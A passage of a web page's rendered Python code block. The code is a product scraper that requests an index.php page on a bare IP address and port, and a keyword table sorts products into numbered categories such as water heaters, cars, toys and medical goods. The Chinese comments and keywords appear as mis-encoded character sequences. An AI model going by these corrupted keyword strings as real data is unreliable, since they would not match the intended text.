class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> logging<br><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span>, <span class="hljs-type">Tuple</span>, <span class="hljs-type">Optional</span><br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urljoin<br><br><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br><br><span class="hljs-comment"># é…ç½®æ—¥å¿—</span><br>logging.basicConfig(<br>    level=logging.INFO,<br>    <span class="hljs-built_in">format</span>=<span class="hljs-string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span><br>)<br>logger = logging.getLogger(__name__)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Config</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;é›†ä¸­ç®¡ç†é…ç½®å‚æ•°&quot;&quot;&quot;</span><br>    BASE_DOMAIN = <span class="hljs-string">&quot;http://47.117.190.214:32800/&quot;</span><br>    ENDPOINT = <span class="hljs-string">&quot;/index.php&quot;</span><br>    REQUEST_TIMEOUT = <span class="hljs-number">15</span><br>    MAX_PRODUCTS = <span class="hljs-number">500</span><br>    OUTPUT_FILE = <span class="hljs-string">&quot;submit_2.csv&quot;</span><br>    HEADERS = &#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 &quot;</span><br>                      <span class="hljs-string">&quot;(KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36&quot;</span><br>    &#125;<br><br><span class="hljs-meta">    @classmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">full_url</span>(<span class="hljs-params">cls</span>) -&gt; <span class="hljs-built_in">str</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;ç”Ÿæˆå®Œæ•´è¯·æ±‚URL&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> urljoin(cls.BASE_DOMAIN, cls.ENDPOINT)<br><br><br><span class="hljs-comment"># åˆ†ç±»å…³é”®è¯æ˜ å°„è¡¨ï¼ˆä¼˜å…ˆçº§ä»é«˜åˆ°ä½ï¼‰</span><br>CATEGORY_KEYWORDS = [<br>    (<span class="hljs-number">11</span>, [<span class="hljs-string">&#x27;çƒ­æ°´å™¨&#x27;</span>, <span class="hljs-string">&#x27;é€Ÿçƒ­&#x27;</span>, <span class="hljs-string">&#x27;æ’æ¸©&#x27;</span>, <span class="hljs-string">&#x27;é˜²å¹²çƒ§&#x27;</span>, <span class="hljs-string">&#x27;å³çƒ­å¼&#x27;</span>, <span class="hljs-string">&#x27;å‚¨æ°´å¼&#x27;</span>, <span class="hljs-string">&#x27;ç”µçƒ­æ°´å™¨&#x27;</span>, <span class="hljs-string">&#x27;ç‡ƒæ°”çƒ­æ°´å™¨&#x27;</span>,<br>          <span class="hljs-string">&#x27;å¤ªé˜³èƒ½çƒ­æ°´å™¨&#x27;</span>, <span class="hljs-string">&#x27;ç©ºæ°”èƒ½çƒ­æ°´å™¨&#x27;</span>, <span class="hljs-string">&#x27;å£æŒ‚ç‚‰&#x27;</span>, <span class="hljs-string">&#x27;çƒ­æ°´ç³»ç»Ÿ&#x27;</span>, <span class="hljs-string">&#x27;å›æ°´è£…ç½®&#x27;</span>, <span class="hljs-string">&#x27;æ’æ¸©é˜€&#x27;</span>,<br>          <span class="hljs-string">&#x27;é•æ£’&#x27;</span>, <span class="hljs-string">&#x27;é˜²ç”µå¢™&#x27;</span>, <span class="hljs-string">&#x27;é€Ÿçƒ­ç”µçƒ­æ°´å™¨&#x27;</span>, <span class="hljs-string">&#x27;é›¶å†·æ°´&#x27;</span>, <span class="hljs-string">&#x27;é¢„å³åŒæ¨¡&#x27;</span>]),<br><br>    (<span class="hljs-number">16</span>, [<span class="hljs-string">&#x27;æ±½è½¦&#x27;</span>, <span class="hljs-string">&#x27;è½¦è½½&#x27;</span>, <span class="hljs-string">&#x27;æœºæ²¹&#x27;</span>, <span class="hljs-string">&#x27;è½®èƒ&#x27;</span>, <span class="hljs-string">&#x27;å˜é€Ÿç®±&#x27;</span>, <span class="hljs-string">&#x27;åˆ¹è½¦ç‰‡&#x27;</span>, <span class="hljs-string">&#x27;é›¨åˆ·&#x27;</span>, <span class="hljs-string">&#x27;ç«èŠ±å¡&#x27;</span>, <span class="hljs-string">&#x27;æ»¤æ¸…å™¨&#x27;</span>,<br>          <span class="hljs-string">&#x27;è“„ç”µæ± &#x27;</span>, <span class="hljs-string">&#x27;è¡Œè½¦è®°å½•ä»ª&#x27;</span>, <span class="hljs-string">&#x27;è½¦è½½å……ç”µå™¨&#x27;</span>, <span class="hljs-string">&#x27;æ±½è½¦è´´è†œ&#x27;</span>, <span class="hljs-string">&#x27;è„šå«&#x27;</span>, <span class="hljs-string">&#x27;æ–¹å‘ç›˜å¥—&#x27;</span>, <span class="hljs-string">&#x27;é˜²å†»æ¶²&#x27;</span>,<br>          <span class="hljs-string">&#x27;ç»ç’ƒæ°´&#x27;</span>, <span class="hljs-string">&#x27;æ‚¬æŒ‚ç³»ç»Ÿ&#x27;</span>, <span class="hljs-string">&#x27;æ¶¡è½®å¢å‹&#x27;</span>, <span class="hljs-string">&#x27;å››è½®å®šä½&#x27;</span>, <span class="hljs-string">&#x27;é’£é‡‘å–·æ¼†&#x27;</span>, <span class="hljs-string">&#x27;æ±½è½¦ç¾å®¹&#x27;</span>, <span class="hljs-string">&#x27;è½¦è¡£&#x27;</span>]),<br><br>    (<span class="hljs-number">15</span>, [<span class="hljs-string">&#x27;ç©å…·&#x27;</span>, <span class="hljs-string">&#x27;ä¹é«˜&#x27;</span>, <span class="hljs-string">&#x27;ç§¯æœ¨&#x27;</span>, <span class="hljs-string">&#x27;é’¢ç´&#x27;</span>, <span class="hljs-string">&#x27;å‰ä»–&#x27;</span>, <span class="hljs-string">&#x27;æ‹¼å›¾&#x27;</span>, <span class="hljs-string">&#x27;é¥æ§è½¦&#x27;</span>, <span class="hljs-string">&#x27;èŠ­æ¯”å¨ƒå¨ƒ&#x27;</span>, <span class="hljs-string">&#x27;å˜å½¢é‡‘åˆš&#x27;</span>,<br>          <span class="hljs-string">&#x27;æ‹¼è£…æ¨¡å‹&#x27;</span>, <span class="hljs-string">&#x27;ç›Šæ™ºç©å…·&#x27;</span>, <span class="hljs-string">&#x27;æ—©æ•™æœº&#x27;</span>, <span class="hljs-string">&#x27;ç£åŠ›ç‰‡&#x27;</span>, <span class="hljs-string">&#x27;è½¨é“è½¦&#x27;</span>, <span class="hljs-string">&#x27;æ¯›ç»’ç©å…·&#x27;</span>, <span class="hljs-string">&#x27;ç”µå­ç´&#x27;</span>, <span class="hljs-string">&#x27;å°æç´&#x27;</span>,<br>          <span class="hljs-string">&#x27;æ¶å­é¼“&#x27;</span>, <span class="hljs-string">&#x27;å°¤å…‹é‡Œé‡Œ&#x27;</span>, <span class="hljs-string">&#x27;å£ç´&#x27;</span>, <span class="hljs-string">&#x27;éŸ³ä¹ç›’&#x27;</span>, <span class="hljs-string">&#x27;ç”»æ¿&#x27;</span>, <span class="hljs-string">&#x27;æ©¡çš®æ³¥&#x27;</span>, <span class="hljs-string">&#x27;æ²™æ»©ç©å…·&#x27;</span>]),<br><br>    (<span class="hljs-number">22</span>, [<span class="hljs-string">&#x27;åŒ»ç–—&#x27;</span>, <span class="hljs-string">&#x27;ä½“æ¸©è®¡&#x27;</span>, <span class="hljs-string">&#x27;è¡€å‹ä»ª&#x27;</span>, <span class="hljs-string">&#x27;è½®æ¤…&#x27;</span>, <span class="hljs-string">&#x27;åŠ©è¡Œå™¨&#x27;</span>, <span class="hljs-string">&#x27;è¡€ç³–ä»ª&#x27;</span>, <span class="hljs-string">&#x27;åˆ¶æ°§æœº&#x27;</span>, <span class="hljs-string">&#x27;é›¾åŒ–å™¨&#x27;</span>, <span class="hljs-string">&#x27;å¬è¯Šå™¨&#x27;</span>,<br>          <span class="hljs-string">&#x27;åŒ»ç”¨å£ç½©&#x27;</span>, <span class="hljs-string">&#x27;é˜²æŠ¤æœ&#x27;</span>, <span class="hljs-string">&#x27;æ‰‹æœ¯åˆ€&#x27;</span>, <span class="hljs-string">&#x27;é’ˆç¸é’ˆ&#x27;</span>, <span class="hljs-string">&#x27;ç†ç–—ä»ª&#x27;</span>, <span class="hljs-string">&#x27;åº·å¤è®¾å¤‡&#x27;</span>, <span class="hljs-string">&#x27;åŠ©å¬å™¨&#x27;</span>, <span class="hljs-string">&#x27;å‘¼å¸æœº&#x27;</span>,<br>          <span class="hljs-string">&#x27;æŠ¤ç†åºŠ&#x27;</span>, <span class="hljs-string">&#x27;è¡€å‹è®¡&#x27;</span>, <span class="hljs-string">&#x27;è¡€æ°§ä»ª&#x27;</span>, <span class="hljs-string">&#x27;æ¶ˆæ¯’æŸœ&#x27;</span>, <span class="hljs-string">&#x27;åŒ»ç”¨çº±å¸ƒ&#x27;</span>, <span class="hljs-string">&#x27;æ£‰ç­¾&#x27;</span>, <span class="hljs-string">&#x27;åˆ›å¯è´´&#x27;</span>]),<br><br>    (<span class="hljs-number">23</span>, [<span class="hljs-string">&#x27;èŠ±å‰&#x27;</span>, <span class="hljs-string">&#x27;ç»¿æ¤&#x27;</span>, <span class="hljs-string">&#x27;å¤šè‚‰&#x27;</span>, <span class="hljs-string">&#x27;ç›†æ ½&#x27;</span>, <span class="hljs-string">&#x27;ç§å­&#x27;</span>, <span class="hljs-string">&#x27;èŠ±ç›†&#x27;</span>, <span class="hljs-string">&#x27;è¥å…»åœŸ&#x27;</span>, <span class="hljs-string">&#x27;å›­è‰ºå‰ª&#x27;</span>, <span class="hljs-string">&#x27;å–·å£¶&#x27;</span>, <span class="hljs-string">&#x27;èŠ±æ¶&#x27;</span>,<br>          <span class="hljs-string">&#x27;è§‚å¶æ¤ç‰©&#x27;</span>, <span class="hljs-string">&#x27;é²œèŠ±&#x27;</span>, <span class="hljs-string">&#x27;å¹²èŠ±&#x27;</span>, <span class="hljs-string">&#x27;èŠ±è‚¥&#x27;</span>, <span class="hljs-string">&#x27;æ€è™«å‰‚&#x27;</span>, <span class="hljs-string">&#x27;ç”Ÿæ ¹ç²‰&#x27;</span>, <span class="hljs-string">&#x27;è‚²è‹—ç›˜&#x27;</span>, <span class="hljs-string">&#x27;è‹”è—“å¾®æ™¯è§‚&#x27;</span>,<br>          <span class="hljs-string">&#x27;æ°´åŸ¹æ¤ç‰©&#x27;</span>, <span class="hljs-string">&#x27;å…°èŠ±&#x27;</span>, <span class="hljs-string">&#x27;ä»™äººæŒ&#x27;</span>, <span class="hljs-string">&#x27;ç»¿è&#x27;</span>, <span class="hljs-string">&#x27;å¯Œè´µç«¹&#x27;</span>, <span class="hljs-string">&#x27;å‘è´¢æ ‘&#x27;</span>, <span class="hljs-string">&#x27;æ–‡ç«¹&#x27;</span>]),<br><br>    (<span class="hljs-number">25</span>, [<span class="hljs-string">&#x27;å›­è‰ºå·¥å…·&#x27;</span>, <span class="hljs-string">&#x27;æ´’æ°´å™¨&#x27;</span>, <span class="hljs-string">&#x27;é“²å­&#x27;</span>, <span class="hljs-string">&#x27;èŠ±ç›†&#x27;</span>, <span class="hljs-string">&#x27;è¥å…»åœŸ&#x27;</span>, <span class="hljs-string">&#x27;ä¿®æå‰ª&#x27;</span>, <span class="hljs-string">&#x27;å«æ¥åˆ€&#x27;</span>, <span class="hljs-string">&#x27;å›­è‰ºæ‰‹å¥—&#x27;</span>,<br>          <span class="hljs-string">&#x27;å‰²è‰æœº&#x27;</span>, <span class="hljs-string">&#x27;ç»¿ç¯±æœº&#x27;</span>, <span class="hljs-string">&#x27;æ ‘æç²‰ç¢æœº&#x27;</span>, <span class="hljs-string">&#x27;å›­è‰ºé”¯&#x27;</span>, <span class="hljs-string">&#x27;æ¾åœŸå™¨&#x27;</span>, <span class="hljs-string">&#x27;è‚²è‹—ç®±&#x27;</span>, <span class="hljs-string">&#x27;è‡ªåŠ¨å–·çŒ&#x27;</span>,<br>          <span class="hljs-string">&#x27;å›­è‰ºæ”¯æ¶&#x27;</span>, <span class="hljs-string">&#x27;æ¥æ°´ç›˜&#x27;</span>, <span class="hljs-string">&#x27;æ’­ç§å™¨&#x27;</span>, <span class="hljs-string">&#x27;å›­è‰ºåœ°å¸ƒ&#x27;</span>, <span class="hljs-string">&#x27;é˜²è‰å¸ƒ&#x27;</span>, <span class="hljs-string">&#x27;æ™ºèƒ½èŠ±ç›†&#x27;</span>, <span class="hljs-string">&#x27;æ¤ç‰©è¡¥å…‰ç¯&#x27;</span>]),<br><br>    (<span class="hljs-number">2</span>, [<span class="hljs-string">&#x27;æ¯å©´&#x27;</span>, <span class="hljs-string">&#x27;å¥¶ç²‰&#x27;</span>, <span class="hljs-string">&#x27;å°¿ä¸æ¹¿&#x27;</span>, <span class="hljs-string">&#x27;å©´å„¿è½¦&#x27;</span>, <span class="hljs-string">&#x27;å¥¶ç“¶&#x27;</span>, <span class="hljs-string">&#x27;å¸å¥¶å™¨&#x27;</span>, <span class="hljs-string">&#x27;å­•å¦‡è£…&#x27;</span>, <span class="hljs-string">&#x27;å¾…äº§åŒ…&#x27;</span>, <span class="hljs-string">&#x27;å©´å„¿åºŠ&#x27;</span>,<br>         <span class="hljs-string">&#x27;å­¦æ­¥è½¦&#x27;</span>, <span class="hljs-string">&#x27;å„¿ç«¥é¤æ¤…&#x27;</span>, <span class="hljs-string">&#x27;éš”å°¿å«&#x27;</span>, <span class="hljs-string">&#x27;å“ºä¹³æ•&#x27;</span>, <span class="hljs-string">&#x27;æ¸©å¥¶å™¨&#x27;</span>, <span class="hljs-string">&#x27;å©´å„¿èƒŒå¸¦&#x27;</span>, <span class="hljs-string">&#x27;é˜²æº¢ä¹³å«&#x27;</span>,<br>         <span class="hljs-string">&#x27;å©´å„¿æ¹¿å·¾&#x27;</span>, <span class="hljs-string">&#x27;å©´å„¿æ²æµ´éœ²&#x27;</span>, <span class="hljs-string">&#x27;æŠ¤è‡€è†&#x27;</span>, <span class="hljs-string">&#x27;å©´å„¿ç†å‘å™¨&#x27;</span>, <span class="hljs-string">&#x27;æ—©æ•™ç©å…·&#x27;</span>, <span class="hljs-string">&#x27;å©´å„¿ç›‘æŠ¤å™¨&#x27;</span>]),<br><br>    (<span class="hljs-number">1</span>, [<span class="hljs-string">&#x27;æ‰‹æœº&#x27;</span>, <span class="hljs-string">&#x27;5G&#x27;</span>, <span class="hljs-string">&#x27;æ™ºèƒ½æœº&#x27;</span>, <span class="hljs-string">&#x27;æ›²é¢å±&#x27;</span>, <span class="hljs-string">&#x27;éªé¾™&#x27;</span>, <span class="hljs-string">&#x27;å…¨é¢å±&#x27;</span>, <span class="hljs-string">&#x27;å¿«å……&#x27;</span>, <span class="hljs-string">&#x27;åŒå¡åŒå¾…&#x27;</span>, <span class="hljs-string">&#x27;æ¸¸æˆæ‰‹æœº&#x27;</span>,<br>         <span class="hljs-string">&#x27;æ‹ç…§æ‰‹æœº&#x27;</span>, <span class="hljs-string">&#x27;é˜²æ°´æ‰‹æœº&#x27;</span>, <span class="hljs-string">&#x27;æŠ˜å å±&#x27;</span>, <span class="hljs-string">&#x27;AMOLED&#x27;</span>, <span class="hljs-string">&#x27;å±ä¸‹æŒ‡çº¹&#x27;</span>, <span class="hljs-string">&#x27;æ¶²å†·æ•£çƒ­&#x27;</span>, <span class="hljs-string">&#x27;è¶…çº§å¿«å……&#x27;</span>,<br>         <span class="hljs-string">&#x27;å‡é™æ‘„åƒå¤´&#x27;</span>, <span class="hljs-string">&#x27;HiFiéŸ³è´¨&#x27;</span>, <span class="hljs-string">&#x27;NFCåŠŸèƒ½&#x27;</span>, <span class="hljs-string">&#x27;æ— çº¿å……ç”µ&#x27;</span>, <span class="hljs-string">&#x27;ç§»åŠ¨ç”µæº&#x27;</span>, <span class="hljs-string">&#x27;æ‰‹æœºå£³&#x27;</span>]),<br><br>    (<span class="hljs-number">6</span>, [<span class="hljs-string">&#x27;å¨æˆ¿&#x27;</span>, <span class="hljs-string">&#x27;ç‚’é”…&#x27;</span>, <span class="hljs-string">&#x27;èœåˆ€&#x27;</span>, <span class="hljs-string">&#x27;ç §æ¿&#x27;</span>, <span class="hljs-string">&#x27;æ´—ç¢—æœº&#x27;</span>, <span class="hljs-string">&#x27;ç”µé¥­ç…²&#x27;</span>, <span class="hljs-string">&#x27;å¾®æ³¢ç‚‰&#x27;</span>, <span class="hljs-string">&#x27;å‹åŠ›é”…&#x27;</span>, <span class="hljs-string">&#x27;æ¦¨æ±æœº&#x27;</span>,<br>         <span class="hljs-string">&#x27;ç©ºæ°”ç‚¸é”…&#x27;</span>, <span class="hljs-string">&#x27;æ–™ç†æœº&#x27;</span>, <span class="hljs-string">&#x27;ç ´å£æœº&#x27;</span>, <span class="hljs-string">&#x27;è’¸çƒ¤ç®±&#x27;</span>, <span class="hljs-string">&#x27;æ²¹çƒŸæœº&#x27;</span>, <span class="hljs-string">&#x27;ç‡ƒæ°”ç¶&#x27;</span>, <span class="hljs-string">&#x27;æ¶ˆæ¯’æŸœ&#x27;</span>, <span class="hljs-string">&#x27;ç»è‚‰æœº&#x27;</span>,<br>         <span class="hljs-string">&#x27;çƒ˜ç„™æ¨¡å…·&#x27;</span>, <span class="hljs-string">&#x27;å¨æˆ¿ç§¤&#x27;</span>, <span class="hljs-string">&#x27;ç£¨åˆ€å™¨&#x27;</span>, <span class="hljs-string">&#x27;æ²¥æ°´ç¯®&#x27;</span>, <span class="hljs-string">&#x27;ä¿é²œç›’&#x27;</span>, <span class="hljs-string">&#x27;å¨æˆ¿ç½®ç‰©æ¶&#x27;</span>]),<br><br>    (<span class="hljs-number">20</span>, [<span class="hljs-string">&#x27;æˆ·å¤–&#x27;</span>, <span class="hljs-string">&#x27;å¸ç¯·&#x27;</span>, <span class="hljs-string">&#x27;ç™»å±±æ–&#x27;</span>, <span class="hljs-string">&#x27;ç¡è¢‹&#x27;</span>, <span class="hljs-string">&#x27;å†²é”‹è¡£&#x27;</span>, <span class="hljs-string">&#x27;ç™»å±±é‹&#x27;</span>, <span class="hljs-string">&#x27;æˆ·å¤–èƒŒåŒ…&#x27;</span>, <span class="hljs-string">&#x27;é‡é¤å«&#x27;</span>,<br>          <span class="hljs-string">&#x27;çƒ§çƒ¤æ¶&#x27;</span>, <span class="hljs-string">&#x27;éœ²è¥ç¯&#x27;</span>, <span class="hljs-string">&#x27;æŒ‡å—é’ˆ&#x27;</span>, <span class="hljs-string">&#x27;æ±‚ç”Ÿå“¨&#x27;</span>, <span class="hljs-string">&#x27;å†›åˆ€å¡&#x27;</span>, <span class="hljs-string">&#x27;é€Ÿå¹²è¡£&#x27;</span>, <span class="hljs-string">&#x27;æŠ“ç»’è¡£&#x27;</span>, <span class="hljs-string">&#x27;æ”€å²©ç»³&#x27;</span>,<br>          <span class="hljs-string">&#x27;å†°çˆª&#x27;</span>, <span class="hljs-string">&#x27;æ»‘é›ªæ¿&#x27;</span>, <span class="hljs-string">&#x27;é’“é±¼ç«¿&#x27;</span>, <span class="hljs-string">&#x27;æµ®æ½œé¢é•œ&#x27;</span>, <span class="hljs-string">&#x27;ç™»å±±æ‰£&#x27;</span>, <span class="hljs-string">&#x27;å¤´ç¯&#x27;</span>, <span class="hljs-string">&#x27;æˆ·å¤–æ°´å£¶&#x27;</span>]),<br><br>    (<span class="hljs-number">10</span>, [<span class="hljs-string">&#x27;è¿åŠ¨&#x27;</span>, <span class="hljs-string">&#x27;è·‘æ­¥æœº&#x27;</span>, <span class="hljs-string">&#x27;ç‘œä¼½å«&#x27;</span>, <span class="hljs-string">&#x27;å“‘é“ƒ&#x27;</span>, <span class="hljs-string">&#x27;æ³³é•œ&#x27;</span>, <span class="hljs-string">&#x27;å¥èº«è½¦&#x27;</span>, <span class="hljs-string">&#x27;æ¤­åœ†æœº&#x27;</span>, <span class="hljs-string">&#x27;ä»°å§æ¿&#x27;</span>,<br>          <span class="hljs-string">&#x27;è¿åŠ¨æŠ¤å…·&#x27;</span>, <span class="hljs-string">&#x27;æ‹‰åŠ›å™¨&#x27;</span>, <span class="hljs-string">&#x27;è·³ç»³&#x27;</span>, <span class="hljs-string">&#x27;ç¾½æ¯›çƒæ‹&#x27;</span>, <span class="hljs-string">&#x27;ä¹’ä¹“çƒæ¡Œ&#x27;</span>, <span class="hljs-string">&#x27;è¶³çƒé‹&#x27;</span>, <span class="hljs-string">&#x27;ç¯®çƒæ¶&#x27;</span>,<br>          <span class="hljs-string">&#x27;è¿åŠ¨æ‰‹ç¯&#x27;</span>, <span class="hljs-string">&#x27;è®¡æ­¥å™¨&#x27;</span>, <span class="hljs-string">&#x27;ç­‹è†œæª&#x27;</span>, <span class="hljs-string">&#x27;è¿åŠ¨æ°´å£¶&#x27;</span>, <span class="hljs-string">&#x27;è¿åŠ¨æ¯›å·¾&#x27;</span>, <span class="hljs-string">&#x27;è¿åŠ¨èƒŒåŒ…&#x27;</span>]),<br><br>    (<span class="hljs-number">21</span>, [<span class="hljs-string">&#x27;ç å®&#x27;</span>, <span class="hljs-string">&#x27;é’»çŸ³&#x27;</span>, <span class="hljs-string">&#x27;é»„é‡‘&#x27;</span>, <span class="hljs-string">&#x27;ç¿¡ç¿ &#x27;</span>, <span class="hljs-string">&#x27;é“‚é‡‘&#x27;</span>, <span class="hljs-string">&#x27;Ké‡‘&#x27;</span>, <span class="hljs-string">&#x27;çç &#x27;</span>, <span class="hljs-string">&#x27;å’Œç”°ç‰&#x27;</span>, <span class="hljs-string">&#x27;ç¥ç€&#x27;</span>,<br>          <span class="hljs-string">&#x27;èœœèœ¡&#x27;</span>, <span class="hljs-string">&#x27;çŠç‘š&#x27;</span>, <span class="hljs-string">&#x27;ç»¿æ¾çŸ³&#x27;</span>, <span class="hljs-string">&#x27;çº¢å®çŸ³&#x27;</span>, <span class="hljs-string">&#x27;è“å®çŸ³&#x27;</span>, <span class="hljs-string">&#x27;ç¥–æ¯ç»¿&#x27;</span>, <span class="hljs-string">&#x27;å©šæˆ’&#x27;</span>, <span class="hljs-string">&#x27;åŠå &#x27;</span>,<br>          <span class="hljs-string">&#x27;æ‰‹é“¾&#x27;</span>, <span class="hljs-string">&#x27;è€³ç¯&#x27;</span>, <span class="hljs-string">&#x27;èƒ¸é’ˆ&#x27;</span>, <span class="hljs-string">&#x27;è½¬è¿ç &#x27;</span>, <span class="hljs-string">&#x27;ç”Ÿè‚–æŒ‚ä»¶&#x27;</span>, <span class="hljs-string">&#x27;æ–‡ç©æ ¸æ¡ƒ&#x27;</span>]),<br><br>    (<span class="hljs-number">14</span>, [<span class="hljs-string">&#x27;é…’æ°´&#x27;</span>, <span class="hljs-string">&#x27;çº¢é…’&#x27;</span>, <span class="hljs-string">&#x27;ç™½é…’&#x27;</span>, <span class="hljs-string">&#x27;å¨å£«å¿Œ&#x27;</span>, <span class="hljs-string">&#x27;å•¤é…’&#x27;</span>, <span class="hljs-string">&#x27;é»„é…’&#x27;</span>, <span class="hljs-string">&#x27;æ¸…é…’&#x27;</span>, <span class="hljs-string">&#x27;ä¼ç‰¹åŠ &#x27;</span>, <span class="hljs-string">&#x27;æœ—å§†é…’&#x27;</span>,<br>          <span class="hljs-string">&#x27;é¸¡å°¾é…’&#x27;</span>, <span class="hljs-string">&#x27;èµ·æ³¡é…’&#x27;</span>, <span class="hljs-string">&#x27;é¦™æ§Ÿ&#x27;</span>, <span class="hljs-string">&#x27;ç²¾é…¿å•¤é…’&#x27;</span>, <span class="hljs-string">&#x27;æœé…’&#x27;</span>, <span class="hljs-string">&#x27;ä¿å¥é…’&#x27;</span>, <span class="hljs-string">&#x27;é…’å…·&#x27;</span>, <span class="hljs-string">&#x27;é†’é…’å™¨&#x27;</span>,<br>          <span class="hljs-string">&#x27;çº¢é…’æ¯&#x27;</span>, <span class="hljs-string">&#x27;é…’æŸœ&#x27;</span>, <span class="hljs-string">&#x27;é…’çª–&#x27;</span>, <span class="hljs-string">&#x27;å¹´ä»½é…’&#x27;</span>, <span class="hljs-string">&#x27;åŸæµ†é…’&#x27;</span>]),<br><br>    (<span class="hljs-number">5</span>, [<span class="hljs-string">&#x27;è”¬èœ&#x27;</span>, <span class="hljs-string">&#x27;æœ‰æœº&#x27;</span>, <span class="hljs-string">&#x27;ç»¿å¶èœ&#x27;</span>, <span class="hljs-string">&#x27;è¥¿çº¢æŸ¿&#x27;</span>, <span class="hljs-string">&#x27;é»„ç“œ&#x27;</span>, <span class="hljs-string">&#x27;èƒ¡èåœ&#x27;</span>, <span class="hljs-string">&#x27;åœŸè±†&#x27;</span>, <span class="hljs-string">&#x27;è¾£æ¤’&#x27;</span>, <span class="hljs-string">&#x27;èŒ„å­&#x27;</span>,<br>         <span class="hljs-string">&#x27;è¥¿å…°èŠ±&#x27;</span>, <span class="hljs-string">&#x27;è èœ&#x27;</span>, <span class="hljs-string">&#x27;èŠ¹èœ&#x27;</span>, <span 